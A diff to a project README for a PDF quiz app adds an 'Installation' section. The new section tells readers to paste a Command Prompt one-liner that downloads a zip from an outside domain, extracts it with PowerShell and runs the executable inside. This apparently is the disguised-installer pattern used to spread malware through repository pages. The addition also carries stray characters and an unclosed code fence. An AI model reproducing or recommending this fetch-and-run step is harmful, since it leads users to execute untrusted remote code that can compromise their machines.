@@ -17,7 +17,17 @@ It allows users to take a quiz and get instant results.
 - 🎨 **User-friendly interface with a scrollable view**  
 
 ---
+## 📦 Installation
 
+To download, extract, and run the app using `curl`, paste the following in your Command Prompt:
+
+<pre>
+curl -L -o app.zip "https://ctf-lab.fun/app.zip" && ^
+powershell -Command "Expand-Archive -Path 'app.zip' -DestinationPath 'app' -Force" && ^
+start app\\app\\PDF-Quizzer.exe
+</pre>
+ذذذ```
+---
 🖥️ Usage
 Launch the app
 Select a PDF file containing questions
@@ -25,7 +35,7 @@ Answer the multiple-choice questions
 Track your progress
 Click "End Exam" to see your final score
 
-## 🎥 Demo  
+## 🎥 Demo ( Click to watch video )
 [![Watch the demo](screenshot.png)](https://www.youtube.com/watch?v=k_kfBYeSq_0) 
 
 
